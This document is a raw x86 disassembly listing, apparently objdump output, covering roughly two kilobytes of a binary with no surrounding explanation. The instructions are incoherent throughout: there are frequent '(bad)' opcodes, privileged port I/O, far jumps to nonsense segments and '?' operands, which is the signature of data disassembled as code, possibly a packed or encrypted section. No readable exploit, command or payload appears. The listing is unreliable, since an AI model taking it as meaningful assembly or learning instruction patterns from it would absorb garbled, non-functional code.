  413f5e:	jae    0x413fd2
  413f60:	ficomp DWORD PTR [edi]
  413f62:	retf   0x1e1e
  413f65:	mov    dl,0xdd
  413f67:	leave  
  413f68:	xor    esi,esp
  413f6a:	mov    esi,?
  413f6c:	dec    ebx
  413f6d:	loope  0x413f00
  413f6f:	leave  
  413f70:	out    dx,al
  413f71:	fwait
  413f72:	jle    0x413f85
  413f74:	out    0x39,al
  413f76:	jb     0x413f29
  413f78:	pop    eax
  413f79:	or     DWORD PTR [ebp+0x30d2a275],0x14bab2d3
  413f83:	mov    ah,0x37
  413f85:	icebp  
  413f86:	adc    bl,BYTE PTR [ecx+eiz*2+0xcce77c9]
  413f8d:	push   edx
  413f8e:	cmp    DWORD PTR [edi+0x38258705],edx
  413f94:	adc    dh,ch
  413f96:	mov    DWORD PTR [edx-0x6693c3b1],0x82796d13
  413fa0:	add    BYTE PTR [ecx],al
  413fa2:	sub    edx,edi
  413fa4:	sub    dl,BYTE PTR [ebp-0x3c]
  413fa7:	jge    0x413fb4
  413fa9:	in     al,0x64
  413fab:	sub    ecx,DWORD PTR [edx-0x4c]
  413fae:	lock imul ebp,DWORD PTR [eax-0x63d4c3af],0x183bfb11
  413fb9:	add    ebp,DWORD PTR [edx+0x724ebe66]
  413fbf:	fs inc ebp
  413fc1:	cmp    al,0x4f
  413fc3:	js     0x413f5d
  413fc5:	cmp    al,0x12
  413fc7:	dec    eax
  413fc8:	mov    cl,0xd8
  413fca:	dec    esp
  413fcb:	xchg   esi,eax
  413fcc:	add    al,bl
  413fce:	dec    edx
  413fcf:	cmp    BYTE PTR [edx-0x3fba31b],0xe2
  413fd6:	mov    eax,0xe8ba4094
  413fdb:	jp     0x413ff1
  413fdd:	out    dx,al
  413fde:	loope  0x414048
  413fe0:	pop    edi
  413fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fe3:	scas   al,BYTE PTR es:[edi]
  413fe4:	loopne 0x41401d
  413fe6:	mov    dh,0xe8
  413fe8:	or     al,0x97
  413fea:	shl    DWORD PTR [esi+0x1d],cl
  413fed:	bnd ret 
  413fef:	ret    0xdd1f
  413ff2:	or     ecx,DWORD PTR [ebx]
  413ff4:	adc    al,0x65
  413ff6:	dec    esi
  413ff7:	sbb    esp,DWORD PTR [edi+eax*1-0x4f]
  413ffb:	add    bl,BYTE PTR [esp+eax*2-0x7c]
  413fff:	stos   BYTE PTR es:[edi],al
  414000:	jg     0x414002
  414002:	outs   dx,DWORD PTR ds:[esi]
  414003:	js     0x414007
  414005:	jo     0x413fcb
  414007:	lea    ebx,[esi]
  414009:	out    dx,al
  41400a:	and    al,0xac
  41400c:	rol    BYTE PTR [edi],1
  41400e:	enter  0x785d,0xb9
  414012:	fcom   QWORD PTR [ebx+0x7d]
  414015:	fstp   QWORD PTR [esi+0x15]
  414018:	sub    DWORD PTR [ecx+0x636c05a6],edi
  41401e:	pop    ecx
  41401f:	xor    BYTE PTR [eax-0x3f],bl
  414022:	push   DWORD PTR [edx-0x619d528e]
  414028:	ret    
  414029:	test   eax,0x80589391
  41402e:	shl    BYTE PTR [edi],cl
  414030:	sub    DWORD PTR ds:0x904ecb0,esi
  414036:	int    0xe7
  414038:	xchg   DWORD PTR [eax-0x4d79dedd],edi
  41403e:	aam    0x3f
  414040:	xor    BYTE PTR [esi+0xd4b9a3a],al
  414046:	(bad)  
  414047:	fnstcw WORD PTR [edx-0x53]
  41404a:	in     al,0xa6
  41404c:	push   0x37bcf7a0
  414051:	in     al,dx
  414052:	pop    esp
  414053:	adc    eax,0xf345c0b3
  414058:	pop    ss
  414059:	adc    eax,0xb83ae457
  41405e:	outs   dx,BYTE PTR ds:[esi]
  41405f:	xor    al,0xac
  414061:	sar    BYTE PTR [esi],0x88
  414064:	and    eax,0xf58eb7dc
  414069:	pop    ss
  41406a:	sub    DWORD PTR [ebp+0x4a761330],eax
  414070:	mov    eax,ds:0x8ea08b14
  414075:	into   
  414076:	das    
  414077:	push   ss
  414078:	lea    eax,[edx+ebp*2]
  41407b:	inc    esp
  41407c:	mov    ebx,0xeb700b12
  414081:	pushf  
  414082:	sbb    ecx,DWORD PTR [eax+0x52a89004]
  414088:	aad    0x65
  41408a:	adc    edi,esi
  41408c:	jmp    0x8576:0x3453effa
  414093:	popa   
  414094:	stos   BYTE PTR es:[edi],al
  414095:	loopne 0x4140c6
  414097:	cmp    dh,BYTE PTR [ebp+edi*4+0xf]
  41409b:	ja     0x414063
  41409d:	inc    eax
  41409e:	out    dx,eax
  41409f:	fadd   QWORD PTR [esi-0x4a]
  4140a2:	js     0x4140d6
  4140a4:	sbb    DWORD PTR [ebx],edi
  4140a6:	dec    ebp
  4140a7:	mov    eax,ds:0xcb0bbe0b
  4140ac:	popa   
  4140ad:	mov    ah,0x97
  4140af:	mov    edi,0x67ffe5d0
  4140b4:	cmp    ebx,ebx
  4140b6:	jbe    0x414102
  4140b8:	sub    ebp,0x2a55f31c
  4140be:	sub    eax,0x518ef95b
  4140c3:	enter  0xb2f6,0x1d
  4140c7:	mov    eax,0x7fdd58ad
  4140cc:	pop    ebx
  4140cd:	xor    DWORD PTR [esi-0x53ac7db9],esi
  4140d3:	inc    ebp
  4140d5:	retf   0xaeef
  4140d8:	arpl   WORD PTR [ecx-0x39df84f5],dx
  4140de:	shl    DWORD PTR [ebx+0x4],cl
  4140e1:	ror    DWORD PTR [edi-0x1c3af85e],cl
  4140e7:	xor    BYTE PTR [ebx+0x2e],bh
  4140ea:	jbe    0x4140de
  4140ec:	outs   dx,DWORD PTR ds:[esi]
  4140ed:	xchg   edx,eax
  4140ee:	and    DWORD PTR ds:0xaf3f6189,ebx
  4140f4:	test   DWORD PTR [esi-0x4e158a12],ebx
  4140fa:	push   0xffffffe3
  4140fc:	sahf   
  4140fd:	retw   
  4140ff:	adc    eax,0x8fb5a2d8
  414104:	scas   eax,DWORD PTR es:[edi]
  414105:	cs adc bl,dh
  414108:	sub    DWORD PTR [eax+ebp*4-0x31d68317],ecx
  41410f:	pop    es
  414110:	jno    0x414133
  414112:	and    eax,DWORD PTR [eax]
  414114:	inc    ebx
  414115:	outs   dx,BYTE PTR ds:[esi]
  414116:	lods   al,BYTE PTR ds:[esi]
  414117:	mov    ch,0xed
  414119:	or     ebx,0x1927fea2
  41411f:	mov    eax,0x371e66bd
  414124:	adc    bh,BYTE PTR [edx]
  414126:	adc    BYTE PTR ds:0xa9ef8e8f,0x0
  41412d:	jno    0x414178
  41412f:	in     al,0x7e
  414131:	rcr    DWORD PTR [ebx],0xb4
  414134:	cmp    DWORD PTR [edi-0x61c82409],ebx
  41413a:	jmp    0x414132
  41413c:	jmp    0x61b3:0xe294aabc
  414143:	clc    
  414144:	mov    ds:0xd807c656,eax
  414149:	mov    ebx,DWORD PTR ds:0x41feb638
  41414f:	pop    edx
  414150:	mov    bh,0xf2
  414152:	sub    bl,BYTE PTR [eax+0x3a26590]
  414158:	mov    al,0x42
  41415a:	xor    al,0xe5
  41415c:	imul   ecx,DWORD PTR [edx],0x73
  41415f:	stc    
  414160:	les    eax,FWORD PTR [edx+0x13]
  414163:	pushf  
  414164:	js     0x4141b7
  414166:	inc    eax
  414167:	push   ss
  414168:	xchg   esi,eax
  414169:	bound  edi,QWORD PTR [edx]
  41416b:	push   eax
  41416c:	sub    al,0x8f
  41416e:	inc    esp
  41416f:	or     al,0x2d
  414171:	mov    ds:0x456fb3c5,al
  414176:	inc    esp
  414177:	int3   
  414178:	pop    es
  414179:	mov    ?,ebx
  41417b:	jne    0x41418f
  41417d:	pop    ecx
  41417e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41417f:	fst    DWORD PTR [edi-0x54]
  414182:	int3   
  414183:	ror    BYTE PTR [eax],0x15
  414186:	ret    0xc0b6
  414189:	aaa    
  41418a:	iret   
  41418b:	lods   eax,DWORD PTR ds:[esi]
  41418c:	xor    DWORD PTR [edx],ebp
  41418e:	jp     0x414190
  414190:	(bad)  
  414191:	loop   0x414125
  414193:	cmc    
  414194:	cmp    BYTE PTR [ebp+0x7d1ac66b],ah
  41419a:	sub    DWORD PTR [edi-0x37],0xa
  41419e:	repnz int 0xe2
  4141a1:	dec    edi
  4141a2:	mov    ds:0xc74598ff,al
  4141a7:	cwde   
  4141a8:	xlat   BYTE PTR ds:[ebx]
  4141a9:	arpl   WORD PTR [edi],ax
  4141ab:	ins    DWORD PTR es:[edi],dx
  4141ac:	cmp    ch,BYTE PTR [edx+0x6d30d351]
  4141b2:	(bad)  
  4141b3:	mov    esi,0x656cd200
  4141b8:	clc    
  4141b9:	push   ebx
  4141ba:	push   ebx
  4141bb:	sahf   
  4141bc:	ror    BYTE PTR [ecx+0x509c9a27],cl
  4141c2:	iret   
  4141c3:	sub    DWORD PTR [esi+0x28],eax
  4141c6:	shl    DWORD PTR [esi+0x7b],1
  4141c9:	jmp    0x1211ebb9
  4141ce:	dec    esp
  4141cf:	inc    ebx
  4141d0:	ds pop es
  4141d2:	repnz sahf 
  4141d4:	pop    ebx
  4141d5:	lea    edi,[ecx-0x47c962a1]
  4141db:	repz popa 
  4141dd:	dec    ebx
  4141de:	push   ecx
  4141df:	nop
  4141e0:	not    BYTE PTR [ecx-0x32ff3b26]
  4141e6:	jmp    0x7f8d:0x1e4c8e70
  4141ed:	lods   eax,DWORD PTR es:[esi]
  4141ef:	mov    ss,WORD PTR [ecx+0x1e]
  4141f2:	not    eax
  4141f4:	sbb    ecx,DWORD PTR [eax+0x16ef8c96]
  4141fa:	test   DWORD PTR [ecx+esi*4],eax
  4141fd:	fcmovnb st,st(5)
  4141ff:	mov    WORD PTR [esi-0x23],?
  414202:	xor    DWORD PTR [ecx],ebp
  414204:	xor    DWORD PTR [ecx-0x58],esi
  414207:	ud1    ecx,edx
  41420a:	nop
  41420b:	in     al,0x2f
  41420d:	push   0xba4666ef
  414212:	popf   
  414213:	icebp  
  414214:	push   esi
  414215:	and    al,BYTE PTR [edx]
  414217:	popf   
  414218:	sub    esi,DWORD PTR [eax+0x5fccbb50]
  41421e:	aad    0xb5
  414220:	push   esp
  414221:	je     0x4141a5
  414223:	aaa    
  414224:	mov    dl,0xaa
  414226:	mov    cl,0x8b
  414228:	fmul   DWORD PTR [edi+edi*4+0x7473eb5a]
  41422f:	inc    eax
  414230:	jmp    0x1a63e128
  414235:	push   esi
  414236:	pop    esi
  414237:	retf   0xa928
  41423a:	sbb    dl,cl
  41423c:	xchg   ecx,eax
  41423d:	jb     0x41427b
  41423f:	out    dx,eax
  414240:	lds    eax,FWORD PTR [edx+0x21eccad]
  414246:	data16 int3 
  414248:	mov    ss,WORD PTR [edi+ebx*2+0x2f]
  41424c:	cmp    eax,DWORD PTR [edx]
  41424e:	mov    edx,0x2ef10f29
  414253:	dec    ebp
  414254:	push   ebx
  414255:	push   ebx
  414256:	jp     0x414243
  414258:	add    ebp,DWORD PTR [esi+eiz*8-0x76]
  41425c:	pop    esp
  41425d:	in     al,0x7c
  41425f:	sub    ebx,edi
  414261:	jl     0x4142e0
  414263:	sub    DWORD PTR [eax],ebx
  414265:	inc    esp
  414266:	shr    BYTE PTR [ebp+0x6c],1
  414269:	bound  edx,QWORD PTR [ebp-0x54]
  41426c:	loopne 0x41422a
  41426e:	and    eax,0x4d46141a
  414273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414274:	pusha  
  414275:	adc    al,0xc5
  414277:	jle    0x4142bd
  414279:	sbb    BYTE PTR [ecx+ebp*1],al
  41427c:	push   es
  41427d:	adc    DWORD PTR [ebx-0x4b43baaa],edx
  414283:	xchg   ebp,eax
  414284:	pop    esi
  414285:	mov    eax,ds:0xf5805569
  41428a:	lahf   
  41428b:	aas    
  41428c:	sub    BYTE PTR [eax+0x5746a86],ah
  414292:	jecxz  0x41430f
  414294:	or     al,dh
  414296:	iret   
  414297:	out    0xd0,al
  414299:	sub    bh,BYTE PTR [eax+0xfcc5d40]
  41429f:	or     BYTE PTR [ecx+0x3b3d970e],bh
  4142a5:	cdq    
  4142a6:	cmc    
  4142a7:	cmp    eax,edi
  4142a9:	mov    dh,0x23
  4142ab:	out    0x74,eax
  4142ad:	and    DWORD PTR [esi+0x10ceace2],ecx
  4142b3:	jnp    0x414272
  4142b5:	add    ebp,esi
  4142b7:	jl     0x414248
  4142b9:	call   0xb289:0x2f9fbe6f
  4142c0:	mov    edx,0x85bff179
  4142c5:	clc    
  4142c6:	pop    ds
  4142c7:	test   al,0x58
  4142c9:	sub    ebp,DWORD PTR [edi+ecx*1+0x1f0fb674]
  4142d0:	int3   
  4142d1:	sbb    eax,0xb9c10b4
  4142d6:	xchg   ebx,eax
  4142d7:	push   cs
  4142d8:	daa    
  4142d9:	popa   
  4142da:	push   ss
  4142db:	and    edi,DWORD PTR [edi+0x14335913]
  4142e1:	push   0xaf5cf11e
  4142e6:	sbb    eax,0xd0e56d6e
  4142eb:	add    DWORD PTR [ebx-0x49],ecx
  4142ee:	sahf   
  4142ef:	sub    eax,0x846a8d95
  4142f4:	xchg   esp,eax
  4142f5:	nop
  4142f6:	(bad)  
  4142f7:	out    0xe,al
  4142f9:	test   al,0x54
  4142fb:	(bad)  
  4142fc:	adc    eax,0xdb2acdb2
  414301:	sbb    ebp,DWORD PTR [ebx-0x48335aa5]
  414307:	pop    es
  414308:	sub    DWORD PTR ds:0x4e88a3b7,edx
  41430e:	or     bh,BYTE PTR ds:0x4f015692
  414314:	hlt    
  414315:	mov    esp,0x37888309
  41431a:	iret   
  41431b:	ins    DWORD PTR es:[edi],dx
  41431c:	ror    BYTE PTR [eax],1
  41431e:	ret    
  41431f:	push   esi
  414320:	dec    ebx
  414321:	mov    bh,0xc3
  414323:	jns    0x414315
  414325:	fldcw  WORD PTR [eax-0x6508f4e7]
  41432b:	ss push 0xdacdd2c4
  414331:	or     BYTE PTR [edx+0x79],cl
  414334:	sbb    cl,BYTE PTR [ecx]
  414336:	je     0x414312
  414338:	mov    al,ds:0xe3a2f982
  41433d:	(bad)  
  41433e:	and    BYTE PTR [edi+0x9],bh
  414341:	push   edx
  414342:	mov    al,ds:0xe06a29ed
  414347:	mov    edx,ds
  414349:	push   ecx
  41434a:	fnstsw WORD PTR [edi+0x49]
  41434d:	cmp    al,0xfd
  41434f:	(bad)  
  414350:	std    
  414351:	(bad)  
  414352:	shr    DWORD PTR [ebp-0x5],0x3
  414356:	mov    esi,0x180b36b8
  41435b:	jmp    0xab4c:0xf3b06e4d
  414362:	mov    edx,0x8b2a2a24
  414367:	in     eax,dx
  414368:	xchg   DWORD PTR [ebx],esi
  41436a:	adc    bl,BYTE PTR [edx+0x32d58270]
  414370:	shl    ebx,cl
  414372:	shr    BYTE PTR [eax-0x4a],0xa1
  414376:	(bad)  [ebx]
  414378:	lea    edi,[edi+0x6b]
  41437b:	lods   eax,DWORD PTR ds:[esi]
  41437c:	dec    ebx
  41437d:	mov    dh,0xf2
  41437f:	mov    WORD PTR [edi-0xd],ss
  414382:	shl    BYTE PTR [ebp-0x134aa26e],1
  414388:	les    edi,FWORD PTR [ebp+ebx*1+0x37c13cde]
  41438f:	lock inc esi
  414391:	mov    ds:0xf308354e,al
  414396:	gs jle 0x4143c2
  414399:	mov    eax,ss
  41439b:	nop
  41439c:	dec    eax
  41439d:	pop    ecx
  41439e:	mov    ebx,ecx
  4143a0:	out    0x69,eax
  4143a2:	cs int 0x41
  4143a5:	ins    DWORD PTR es:[edi],dx
  4143a6:	push   edx
  4143a7:	mov    ebp,0x8c58662e
  4143ac:	jae    0x41438b
  4143ae:	jg     0x41441a
  4143b0:	(bad)  
  4143b1:	mov    edx,0xf7631186
  4143b6:	in     al,dx
  4143b7:	iret   
  4143b8:	cdq    
  4143b9:	push   ebp
  4143ba:	sub    al,0xb
  4143bc:	cs mov ecx,0x976e1eba
  4143c2:	xor    cl,cl
  4143c4:	push   ss
  4143c5:	add    al,0xd5
  4143c7:	xlat   BYTE PTR ds:[ebx]
  4143c8:	mov    al,ds:0xfaebad05
  4143cd:	dec    edx
  4143ce:	lods   al,BYTE PTR ds:[esi]
  4143cf:	fidivr DWORD PTR [ebp+0x73d6f1d6]
  4143d5:	(bad)  
  4143d6:	cld    
  4143d7:	sbb    DWORD PTR [esp+eiz*4+0x49],edx
  4143db:	sub    al,0xf6
  4143dd:	(bad)  
  4143de:	out    0xeb,al
  4143e0:	sub    DWORD PTR [edi],0xfffffff7
  4143e3:	(bad)  
  4143e4:	daa    
  4143e5:	popf   
  4143e6:	jl     0x4143c9
  4143e8:	mov    edi,0xc0de91b6
  4143ed:	xchg   ebp,eax
  4143ee:	pop    es
  4143ef:	adc    eax,0x2651f619
  4143f4:	arpl   bx,si
  4143f6:	cmp    eax,0xc905e0fa
  4143fb:	test   eax,0xeb3221be
  414400:	mov    ecx,0x1d5e4ca3
  414405:	test   BYTE PTR [ecx],dh
  414407:	push   ss
  414408:	jae    0x4143d7
  41440a:	hlt    
  41440b:	or     BYTE PTR [ecx],al
  41440d:	outs   dx,BYTE PTR ds:[esi]
  41440e:	lods   al,BYTE PTR ds:[esi]
  41440f:	test   BYTE PTR [edx],0xeb
  414412:	mov    edi,0x25e6a64a
  414417:	ret    0xab11
  41441a:	stos   BYTE PTR es:[edi],al
  41441b:	mov    al,0x6e
  41441d:	cmp    esi,DWORD PTR [edi-0x6def3c28]
  414423:	(bad)  
  414424:	pop    ebp
  414425:	and    eax,0x224b7631
  41442a:	mov    bl,0xc4
  41442c:	sbb    esi,edi
  41442e:	push   ecx
  41442f:	fs popf 
  414431:	frstor [ebp-0x3b17a753]
  414437:	sbb    al,0x5e
  414439:	jle    0x414420
  41443b:	rcl    BYTE PTR [edi+0x6b],cl
  41443e:	xchg   BYTE PTR [edi],ah
  414440:	popa   
  414441:	(bad)  
  414442:	stc    
  414443:	repnz cdq 
  414445:	xor    eax,DWORD PTR [eax-0x1b]
  414448:	push   esp
  414449:	add    DWORD PTR [edx-0x34],edi
  41444c:	mov    dh,0xa
  41444e:	mov    bl,0x98
  414450:	xchg   BYTE PTR [ecx+0xc],bh
  414453:	and    edi,DWORD PTR [ebp+0x60ce526c]
  414459:	(bad)  
  41445b:	jmp    0x4144d2
  41445d:	inc    esi
  41445e:	sub    esp,DWORD PTR [esi]
  414460:	rcl    BYTE PTR [ecx+0xa723c71],cl
  414466:	into   
  414467:	xlat   BYTE PTR ds:[ebx]
  414468:	outs   dx,BYTE PTR ds:[esi]
  414469:	cwde   
  41446a:	iret   
  41446b:	fistp  DWORD PTR [edx+edx*1]
  41446e:	pop    esp
  41446f:	dec    esi
  414470:	hlt    
  414471:	mov    DWORD PTR [ecx-0x492990],ecx
  414477:	dec    esi
  414478:	stos   BYTE PTR es:[edi],al
  414479:	mov    al,0x4a
  41447b:	pop    ebp
  41447c:	pop    ebp
  41447d:	pop    ecx
  41447e:	out    0x4e,eax
  414480:	pushf  
  414481:	adc    al,0x5b
  414483:	in     eax,dx
  414484:	sti    
  414485:	xor    al,0x94
  414487:	jns    0x414452
  414489:	jae    0x414464
  41448b:	pop    esp
  41448c:	(bad)  
  41448d:	fsubrp st(0),st
  41448f:	sbb    ebp,esi
  414491:	fisubr DWORD PTR [ebx+0xe656]
	...
  414513:	add    ah,ch
  414515:	ss ins BYTE PTR es:[edi],dx
  414517:	or     esi,edi
  414519:	pop    ebx
  41451a:	in     eax,dx
  41451b:	test   DWORD PTR [edi-0x26],0x67e79ed2
  414522:	ret    
  414523:	pop    edx
  414524:	sub    ebx,0x0
  414527:	add    BYTE PTR [ecx+0x7],ch
  41452a:	add    BYTE PTR [eax],al
  41452c:	fdivp  st(1),st
  41452e:	imul   ebx,edi,0xffffffa9
  414531:	add    eax,0x60b9d54b
  414536:	test   eax,0x22de6c0a
  41453b:	outs   dx,BYTE PTR ds:[esi]
  41453c:	dec    edi
  41453d:	iret   
  41453e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41453f:	pop    ss
  414540:	lods   al,BYTE PTR ds:[esi]
  414541:	xchg   esp,eax
  414542:	cwde   
  414543:	xor    bh,cl
  414545:	pop    ecx
  414546:	bound  esi,QWORD PTR [ebx+edi*8+0x45]
  41454a:	mov    edx,0x3935dcf2
  41454f:	sbb    DWORD PTR [ecx-0x79d80b2f],0x3e66fbc0
  414559:	imul   eax,DWORD PTR [ebx],0x57554655
  41455f:	mov    bh,0x4f
  414561:	mov    dh,0x55
  414563:	std    
  414564:	daa    
  414565:	pop    eax
  414566:	jle    0x41459e
  414568:	imul   edi,DWORD PTR [ecx+0x519a3d3a],0x50
  41456f:	mov    ebp,0xd2c867d6
  414574:	retf   0x42b6
  414577:	fincstp 
  414579:	sub    al,0x2
  41457b:	es out dx,eax
  41457d:	jecxz  0x4145c5
  41457f:	jae    0x41456a
  414581:	or     DWORD PTR [esi+eiz*8+0x1903adc9],esi
  414588:	les    ebp,FWORD PTR [eax-0x7b]
  41458b:	mov    cl,BYTE PTR [ebx]
  41458d:	mov    dl,0x8f
  41458f:	push   ss
  414590:	push   eax
  414591:	dec    ebp
  414592:	jp     0x414521
  414594:	mov    dl,0xa9
  414596:	push   ss
  414597:	and    eax,0xb7a66917
  41459c:	xor    DWORD PTR [edx],ebx
  41459e:	pop    ds
  41459f:	add    eax,0x113cb856
  4145a4:	sbb    dl,BYTE PTR [ecx+0x469a2ce0]
  4145aa:	stos   BYTE PTR es:[edi],al
  4145ab:	pop    edx
  4145ac:	jle    0x414620
  4145ae:	jp     0x41456e
  4145b0:	into   
  4145b1:	push   ebp
  4145b2:	mov    ch,0xc8
  4145b4:	lds    esp,FWORD PTR [edx-0x70a4dd88]
  4145ba:	mov    al,ds:0x5bed3aeb
  4145bf:	popf   
  4145c0:	ds pop es
  4145c2:	jmp    0xaada:0x7553aada
  4145c9:	xor    BYTE PTR [ecx],bh
  4145cb:	and    ecx,ecx
  4145cd:	inc    esp
  4145ce:	popa   
  4145cf:	xor    DWORD PTR [ebx+0x7f],ecx
  4145d2:	mov    DWORD PTR [edx+ebx*8-0x6aeebcf8],eax
  4145d9:	add    al,0x75
  4145db:	into   
  4145dc:	jbe    0x41460b
  4145de:	or     DWORD PTR [edi-0x6f],eax
  4145e1:	mov    edi,0xa296a008
  4145e6:	add    cl,BYTE PTR [eax+eiz*2+0xc92197b]
  4145ed:	int3   
  4145ee:	inc    eax
  4145ef:	xor    BYTE PTR [edx+0x34],bl
  4145f2:	in     al,0x6c
  4145f4:	in     al,0x4f
  4145f6:	sub    al,0x7b
  4145f8:	pop    ebp
  4145f9:	mov    edi,0xb76e7b0a
  4145fe:	mov    ebx,0x9830c553
  414603:	pop    ds
  414604:	lock xor BYTE PTR [edx-0x69],cl
  414608:	cmp    BYTE PTR [esi],ch
  41460a:	(bad)  
  41460b:	mov    bl,0xb4
  41460d:	adc    al,0xbe
  41460f:	in     eax,dx
  414610:	xor    eax,0x4e9402e0
  414615:	adc    cl,cl
  414617:	dec    ebp
  414618:	daa    
  414619:	into   
  41461a:	add    esp,DWORD PTR [edx]
  41461c:	sub    DWORD PTR [ebx+eax*2],edx
  41461f:	pusha  
  414620:	rcr    BYTE PTR [esi+0x1f],1
  414623:	mov    cl,0xb7
  414625:	push   edx
  414626:	add    DWORD PTR [esi-0x19],ebp
  414629:	retf   
  41462a:	sbb    edx,edx
  41462c:	and    al,0x2e
  41462e:	lds    edx,FWORD PTR [ecx]
  414630:	sub    eax,ebp
  414632:	xchg   ecx,eax
  414634:	hlt    
  414635:	mov    dh,0x15
  414637:	xchg   edi,eax
  414638:	retf   0x47f6
  41463b:	pop    edi
  41463c:	mov    eax,ds:0xcb7bc43d
  414641:	inc    BYTE PTR [ebx+0x65]
  414644:	pusha  
  414645:	add    BYTE PTR [edx],bl
  414647:	xchg   ebx,eax
  414648:	mov    ch,0x67
  41464a:	popf   
  41464b:	cs loopne 0x414617
  41464e:	jnp    0x4146b1
  414650:	add    eax,edx
  414652:	shl    BYTE PTR [edx],cl
  414654:	or     ebx,DWORD PTR [ebx]
  414656:	pop    eax
  414657:	in     eax,dx
  414658:	push   ebx
  414659:	shl    BYTE PTR [edi+0x1f],0x16
  41465d:	(bad)  
  41465f:	xchg   edi,eax
  414660:	std    
  414661:	push   ds
  414662:	(bad)  
  414663:	mov    ecx,0xc6d6cdeb
  414668:	xchg   ebx,eax
  414669:	data16 ins BYTE PTR es:[edi],dx
  41466b:	pop    edx
  41466c:	shl    eax,0x70
  41466f:	aas    
  414670:	or     al,0xd3
  414672:	xor    edi,DWORD PTR [ebx]
  414674:	pop    eax
  414675:	int    0xa
  414677:	inc    BYTE PTR ds:0xd77c0b30
  41467d:	or     ch,ah
  41467f:	sar    BYTE PTR [esi+0x77a5decf],cl
  414685:	mov    edi,0xbbddec82
  41468a:	or     DWORD PTR [ebp+0x3854f690],0x46bb2301
  414694:	sub    eax,0xffef9609
  414699:	ja     0x4146c5
  41469b:	fsubrp st(3),st
  41469d:	clc    
  41469e:	cmp    dl,BYTE PTR [esi-0x50]
  4146a1:	int    0x14
  4146a3:	cmc    
  4146a4:	mov    DWORD PTR ds:0x5b69fcd9,esp
  4146aa:	fdivr  DWORD PTR [ebx-0x1f]
  4146ad:	xchg   ecx,eax
  4146ae:	inc    eax
  4146af:	add    BYTE PTR [ecx-0x769d9c17],0xcd
  4146b6:	mov    edx,0xf0afce45
  4146bb:	iret   
  4146bc:	(bad)  
  4146bd:	ins    BYTE PTR es:[edi],dx
  4146be:	inc    edi
  4146bf:	sbb    eax,0x15e2c21d
  4146c4:	out    0xfe,al
  4146c6:	mov    dh,BYTE PTR [esi]
  4146c8:	mov    al,ds:0xcec99a24
  4146cd:	dec    eax
  4146ce:	adc    eax,0x114d7c34
  4146d3:	shr    BYTE PTR [edi-0x3986ab8c],1
  4146d9:	add    al,0xd8
  4146db:	inc    ebx
  4146dc:	sbb    al,0xb7
  4146de:	imul   DWORD PTR [ecx-0x7b4c807b]
  4146e4:	push   ecx
  4146e5:	adc    dh,BYTE PTR [esi+0x10]
  4146e8:	lea    ebp,[ebx+0x2b]
  4146eb:	jnp    0x4146f2
  4146ed:	imul   edi,DWORD PTR [esi-0x4d176998],0xffffffe4
  4146f4:	ret    0x6e87
  4146f7:	ja     0x4146df
  4146f9:	adc    dl,BYTE PTR [edx+ebp*2]
  4146fc:	and    ch,BYTE PTR [eax+ebx*4+0x3f]
  414700:	adc    BYTE PTR [esi+0x1b],cl
  414703:	jg     0x414781
  414705:	stos   DWORD PTR es:[edi],eax
  414706:	repnz arpl WORD PTR cs:[eax+ebp*2-0x3b4a458c],dx
  41470f:	mov    eax,ds:0x4016451b
  414714:	stos   DWORD PTR es:[edi],eax
  414715:	jg     0x41472d
  414717:	aam    0x99
  414719:	cld    
  41471a:	cmc    
  41471b:	imul   ebp,DWORD PTR [eax-0x73],0xa172a1de
  414722:	mov    esi,0x567c3aa3
  414727:	adc    BYTE PTR [ebx],cl
  414729:	inc    DWORD PTR [edi+ecx*1]
  41472c:	push   ebp
  41472d:	push   eax
  41472e:	fidiv  WORD PTR [edx]
  414730:	sub    ebx,DWORD PTR [edi+0x4c]
  414733:	fnstsw WORD PTR [edx]
  414735:	int    0x8a
  414737:	out    0x5d,al
  414739:	shl    BYTE PTR ds:0x75f6607c,0x5c
  414740:	test   al,0xe
  414742:	fneni(8087 only) 
  414744:	jge    0x41474b
  414746:	clc    
  414747:	retf   
  414748:	ret    
  414749:	mov    al,es:0xa4b71d3f
  41474f:	xor    esi,DWORD PTR [edx]
  414751:	in     al,0x31
  414753:	mov    DWORD PTR [ecx+ebp*1+0x147c7f68],edx
  41475a:	outs   dx,DWORD PTR ds:[esi]
  41475b:	test   BYTE PTR [ebx],ch
  41475d:	sub    DWORD PTR [edi+ecx*4],0xac6342c6
  414764:	fsubr  DWORD PTR [esi-0x64]
  414767:	(bad)  
  414768:	rcr    BYTE PTR [edx],cl
  41476a:	inc    edx
  41476b:	mov    ch,0x3a
  41476d:	mov    ecx,edi
  41476f:	cmp    bl,al
  414771:	aaa    
  414772:	ss jne 0x414774
  414775:	les    ebx,FWORD PTR [esi-0x2a90f124]
  41477b:	lock or bh,dl
  41477e:	ret    0xa738
  414781:	(bad)  
  414782:	lods   eax,DWORD PTR ds:[esi]
  414783:	xchg   edx,eax
  414784:	int    0xca
  414786:	out    0xcc,eax
  414788:	int    0x2c
  41478a:	inc    ecx
  41478b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41478c:	cmc    
  41478d:	jae    0x4147fc
  41478f:	stos   BYTE PTR es:[edi],al
  414790:	mov    eax,0x6d581ed4
  414795:	shl    DWORD PTR ds:0x612944bd,0x8d
  41479c:	sub    DWORD PTR [ebx-0x53],0x77cdb481
  4147a3:	jp     0x4147c5
  4147a5:	xor    al,0x2d
  4147a7:	cmc    
  4147a8:	xchg   DWORD PTR [eax-0x5f621d53],eax
  4147ae:	and    ebp,eax
  4147b0:	pop    esi
  4147b1:	aas    
  4147b2:	push   0xeeba4a1e
  4147b7:	dec    ecx
  4147b8:	cmp    cl,BYTE PTR [esi-0x5ca149ab]
  4147be:	lods   eax,DWORD PTR ds:[esi]
  4147bf:	inc    edx
  4147c0:	(bad)  
  4147c1:	cli    
  4147c2:	cs xchg ebp,eax
  4147c4:	mov    ds:0xc4743df9,eax
  4147c9:	cmp    BYTE PTR [eax+0x61],0xf3
  4147cd:	sub    cl,dh
  4147cf:	scas   al,BYTE PTR es:[edi]
  4147d0:	aam    0x6a
  4147d2:	add    BYTE PTR [edi],dl
  4147d4:	inc    esp
  4147d5:	or     edi,DWORD PTR [ecx+0x1eec7c0e]
  4147db:	jge    0x414773
  4147dd:	je     0x41477b
  4147df:	adc    bl,dl
